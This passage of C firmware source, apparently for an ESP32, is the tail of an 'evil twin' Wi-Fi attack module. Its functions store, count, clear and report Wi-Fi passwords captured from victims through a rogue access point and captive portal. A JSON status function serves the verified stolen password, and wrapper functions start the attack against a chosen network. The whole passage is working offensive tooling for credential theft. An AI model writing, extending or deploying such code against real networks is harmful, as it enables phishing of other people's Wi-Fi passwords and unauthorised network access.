    int count = et_password_count;
    if (count > max_entries) count = max_entries;
    memcpy(out_entries, et_passwords, sizeof(eviltwin_password_entry_t) * count);
    *out_count = count;
    xSemaphoreGive(et_mutex);

    return ESP_OK;
}

int attack_eviltwin_get_password_count(void) {
    if (et_mutex == NULL) return 0;
    xSemaphoreTake(et_mutex, portMAX_DELAY);
    int count = et_password_count;
    xSemaphoreGive(et_mutex);
    return count;
}

void attack_eviltwin_clear_passwords(void) {
    if (et_mutex == NULL) return;
    xSemaphoreTake(et_mutex, portMAX_DELAY);
    memset(et_passwords, 0, sizeof(et_passwords));
    et_password_count = 0;
    et_pw_verified = false;
    et_verified_pw[0] = '\0';
    xSemaphoreGive(et_mutex);
}

/* ------------------------------------------------------------------ */
/*  Status                                                             */
/* ------------------------------------------------------------------ */

void attack_eviltwin_get_status(eviltwin_status_t *out) {
    if (out == NULL) return;
    memset(out, 0, sizeof(*out));
    if (et_mutex == NULL) return;
    xSemaphoreTake(et_mutex, portMAX_DELAY);
    out->running = et_running;
    strncpy(out->target_ssid, et_config.ssid, EVILTWIN_MAX_SSID_LEN - 1);
    out->target_channel = et_config.channel;
    out->captured_count = et_password_count;
    out->portal_hits = et_portal_hits;
    out->clients_connected = et_clients_connected;
    out->password_verified = et_pw_verified;
    strncpy(out->verified_password, et_verified_pw, EVILTWIN_MAX_PW_LEN - 1);
    xSemaphoreGive(et_mutex);
}

const char *attack_eviltwin_get_status_json(void) {
    static char json_buf[512];
    eviltwin_status_t st = {0};
    attack_eviltwin_get_status(&st);

    snprintf(json_buf, sizeof(json_buf),
        "{\"running\":%s,\"ssid\":\"%s\",\"channel\":%d,"
        "\"captured_count\":%d,\"portal_hits\":%d,\"clients\":%d,"
        "\"password_verified\":%s,\"verified_password\":\"%s\"}",
        st.running ? "true" : "false",
        st.target_ssid,
        st.target_channel,
        st.captured_count,
        st.portal_hits,
        st.clients_connected,
        st.password_verified ? "true" : "false",
        st.verified_password);

    return json_buf;
}

/* ------------------------------------------------------------------ */
/*  Legacy API compatibility - matches existing attack_eviltwin.h      */
/* ------------------------------------------------------------------ */

/**
 * attack_method_evil_twin - called from webserver's existing handler.
 * Takes a wifi_ap_record_t pointer (matching existing API).
 */
void attack_method_evil_twin(void *ap_record_ptr) {
    if (ap_record_ptr == NULL) return;

    wifi_ap_record_t *ap = (wifi_ap_record_t *)ap_record_ptr;
    attack_eviltwin_start_simple((const char *)ap->ssid, ap->primary, ap->bssid);
}

/**
 * attack_method_evil_twin_stop - stops the evil twin attack.
 */
void attack_method_evil_twin_stop(void) {
    attack_eviltwin_stop();
}
